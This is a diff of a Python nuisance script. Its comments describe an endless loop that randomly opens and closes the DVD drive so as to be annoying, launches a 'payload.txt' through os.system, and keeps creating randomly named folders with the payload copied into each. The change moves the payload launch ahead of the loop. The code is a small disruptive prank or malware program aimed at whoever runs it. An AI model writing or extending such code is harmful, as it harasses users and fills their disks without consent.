@@ -21,6 +21,11 @@ script = argv
 #access the last input in the command console, that is needed to clone the files
 name = str(script[0])
 
+#starts the payload text file, stored as a variable
+cmd = 'start payload.txt'
+#enters the variable into the CMD command
+os.system(cmd)
+
 #while loop to do the opening and closing of the DVDdrive.
 #everything in this loop is ran on every iteration, That includes the creation of a new waitTime integers,
 #that is done to not create a pattern where the diskdrive opens and closes regularly and is this more annoying.
@@ -44,10 +49,6 @@ while True:
 	if __name__ == '__main__':
 		print (gen_hex_colour_code())
 	
-	#starts the payload text file, stored as a variable
-	cmd = 'start payload.txt'
-	#enters the variable into the CMD command
-	os.system(cmd)
 	#Makes a new new directory within the original folder called: clone
 	os.mkdir(gen_hex_colour_code())
 	#Runs a copy command where the Payload text file is copied to the newly made directory
